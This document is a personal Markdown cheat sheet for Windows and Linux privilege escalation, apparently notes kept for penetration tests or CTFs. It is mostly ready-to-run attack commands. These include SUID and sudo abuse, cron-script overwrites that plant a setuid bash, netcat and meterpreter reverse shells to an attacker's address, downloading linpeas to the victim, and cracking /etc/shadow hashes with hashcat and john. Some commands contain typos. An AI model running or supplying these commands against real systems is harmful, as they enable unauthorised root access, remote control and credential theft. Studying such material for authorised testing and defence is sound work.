# Privilege-Escalation
###Manual Enumeration
1. processes-services :

```bash
#Windows 
tasklist /svc

#Linux
ps aux
```

1. About-version :

```bash
#Windows 
systeminfo | findstr /c:”os name” /c:”os  version” /c:”systemtype”

#Linux
uname -a || cat /etc/issue
```

1. Enum-Host_Name :

```bash
#Windows & Linux
 
hostname
```

1. Enum-Users :

```bash
#Windows
whoami || net user || net user <username> 

#Linux
whoami ||id|| cat /etc/passwd 
```

### Network Enum

1. Open Ports :

```bash
#Windows
ipconfig /all || route print||netstat -ano    

#Linux
ip a || ifconfig ss -anp || cat /sbin/route || netstat -anp
```

### Firewall Enum

- Linux
`iptables` ⇒However, depending on how the firewall is configured, we may be able to glean information about the rules as a standard user || `/etc/iptables`
- Windows
`netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all`
### Enumerating scheduled tasks

Scheduled task :

---

```bash
1. nano test.sh
2. chmod u+s /bin/sh
3. chmod +x test.sh
4. nano /etc/crontab
- * * * * * root /home/luka/test.sh
1. $ /bin/sh -p
2. $ whoami
```

---

in windows

```bash
schtasks /query /fo LIST /v     
```

---

### Enum installed applications and patch levels

for Windows :

```bash
- wmic product get name, version, vendor
- wmic qfe get capion, discription, hosfixid, nstalledon
```

for Linux

```bash
dpkg -l
```

---

### Enum readable/writable files and directories

- for windows
- exec tool like ⇒ accesschk

```bash
c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Prog ram Files”
```

- powershell script :

```powershell
>Get-ChildItem "C:\Program Files" -R ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

- for linux

```bash
find / -writable -type d 2>/dev/null
```

---

### unmounted disks



- Windows

```powershell
mountvol
```

- Linux

```bash
mount
```

---

### Device Drivers and kernal modules



- Windows

```powershell
drivequery.exe /v /fe csv | convertfrom-csv | select-object ‘display name’, ‘start mode’, path 
```

- Linux

```bash
1. lsmod
2. modinfo <modulename>
```

====================================

## Automation

===============

Runas escalation via ⇒ CVE-2019-1388

===============

# Linux privesc
1. for upgrade shell

```bash
SHELL=/bin/bash script -q /dev/null
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl +z
stty raw -echo && fg
reset
xterm2-
```

```bash
# upload linpeas
⇒ in your terminal
**sudo python3 -m http.server 1234
⇒** in victim machiene
**curl 10.10.16.15:1234/linpeas.sh >> linpeas**
```

1. `chmod u+s /bin/sh`
2. www-data ⇒ data bases
3. to compile c files → $ `gcc <file-name> -o <name>`

---

---

---

```bash
$ whoami
-----
## sudo without passwd
$ sudo -l 
eh el7agat elle momken asta5dem feha sudo bdon ma yetlob password
#if /usr/bin/env then : 
$ sudo /usr/bin/env /bin/bash
-----
##(kernal version vulns)
$ uname -a 
$searchsploit <linux kernel version>
-----
## SUID Perm

$ find / -perm 4000 2>/div/null 
$ find / -user root -perm -4000 -print 2>/dev/null
$ find / -type f -perm -04000 -ls 2>/dev/null
$ find / -type f -perm -u=s 2>/dev/null | xargs ls -l
$ find / -perm -u=s -type f 2>/dev/null
$ find / -user root -perm -4000 -exec ls -ldb {} \;

EX >> rwsx___.. /bin/nmap => root perm
$nmap --interactive
nmap> !whoami
if root 
nmap> !nc -n <my-ip> <port> -e /bin/bash
https://vk9-sec.com/nmap-privilege-escalation
-----
#crontab file => which run every <s-time>
/etc/crontab
##i can use that to do backdoor
-----

```

[Nmap - privilege escalation | VK9 Security](https://vk9-sec.com/nmap-privilege-escalation/)

[Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses)

## sudo < v1.28

```bash
sudo -u#-1 /bin/bash
```

## Path

If you **have write permissions on any folder inside the `PATH`** variable you may be able to hijacking some libraries or binaries:

```bash
echo $PATH
```

# Scheduled/Cron jobs

Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).

```bash
crontab -l
```

```bash
ls -al /etc/cron* /etc/at*
```

```bash
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

## Cron path

For example, inside */etc/crontab* you can find the PATH: *`PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`*

(*Note how the user "user" has writing privileges over /home/user*)

If inside this crontab the root user tries to execute some command or script without setting the path. For example: ** * * * root overwrite.sh*
Then, you can get a root shell by using:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

#Wait cron job to be executed

```bash
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

## Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>

#Wait until it is executed

/tmp/bash -p
```

If the script executed by root uses a **directory where you have full access**, maybe it could be useful to delete that folder and **create a symlink folder to another one** serving a script controlled by you

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

#######

```bash
#!/bin/bash    
#if tاis file run as root i can take shell as root :D
nc -n <ip> <port> -e /bin/bash
```

#for upgrade with meterpreter

```bash
# to create reverse shell file
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=//myip LPORT=rand-port -f elf > shell.elf
#send shell.elf to vectim machine
#in my terminal 
$ msfconsole
msf> use exploit/multi/handler
msf> set payload linux/x64/meterpreter/reverse_tcp
msf> set lhost <my ip> 
msf> set lport <my rand port>
msf> exploit
# on vectim machine run the shell file 
#to get reverse shell in meterpreter
#to turn the meterpreter to shell 
meterpreter> shell
sell# exit
meterpreter> help 
```

exploits:

1. kernel exploits: ⇒ vuls in version ... EX.( dirty c0w)
2. stored passwords (config files)
3. stored passwords (History) .. /.bash_history
4. weak permission ⇒ /etc/shadow —> unshadow passwd shadow > output.txt —→ crack

$hashcat -m 1800 output.txt rockyou.txt -O

1. ssh keys —→ find / -name id_rsa 2> /dev/null
2. shell escaping ⇒sudo -l 
3. sudo abusing intended functionality

⇒sudo apache2 -f /etc/shadow ⇒root hash ⇒ echo ‘[ root hash ]’ > x.txt

john —wordlist=/user/share/wordlist/nmap.lst x.txt

1. sudo (LD_PRELOAD)
